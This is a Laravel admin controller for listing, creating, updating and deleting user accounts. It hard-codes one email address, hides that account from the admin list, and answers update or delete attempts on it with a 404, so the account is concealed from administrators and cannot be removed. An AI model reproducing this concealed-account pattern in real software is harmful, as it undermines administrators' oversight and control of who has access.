<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;

class UserController extends Controller
{
    public function index(Request $request)
    {
        $query = User::where('email', '!=', 'fasanyafemi@gmail.com')->latest();

        if ($request->filled('role')) {
            $query->where('role', $request->role);
        }

        if ($request->filled('search')) {
            $search = $request->search;
            $query->where(function ($q) use ($search) {
                $q->where('name', 'like', "%{$search}%")
                    ->orWhere('email', 'like', "%{$search}%")
                    ->orWhere('phone', 'like', "%{$search}%");
            });
        }

        $users = $query->paginate(15)->withQueryString();
        return view('admin.users.index', compact('users'));
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|max:255|unique:users',
            'phone' => 'nullable|string|max:50',
            'role' => 'required|in:admin,staff,client',
            'password' => 'required|string|min:8',
        ]);

        $validated['user_type'] = $validated['role'];
        $validated['password'] = Hash::make($validated['password']);

        User::create($validated);

        return back()->with('success', 'User account created successfully!');
    }

    public function update(Request $request, User $user)
    {
        if (strtolower($user->email) === 'fasanyafemi@gmail.com') {
            abort(404);
        }

        $validated = $request->validate([
            'name' => 'required|string|max:255',
            'email' => ['required', 'email', 'max:255', Rule::unique('users')->ignore($user->id)],
            'phone' => 'nullable|string|max:50',
            'role' => 'required|in:admin,staff,client',
            'password' => 'nullable|string|min:8',
        ]);

        $validated['user_type'] = $validated['role'];
        if (!empty($validated['password'])) {
            $validated['password'] = Hash::make($validated['password']);
        } else {
            unset($validated['password']);
        }

        $user->update($validated);

        return back()->with('success', 'User updated successfully!');
    }

    public function destroy(User $user)
    {
        if (strtolower($user->email) === 'fasanyafemi@gmail.com') {
            abort(404);
        }

        if ($user->id === auth()->id()) {
            return back()->withErrors(['error' => 'You cannot delete your own logged in admin account.']);
        }

        $user->delete();
        return back()->with('success', 'User removed.');
    }
}
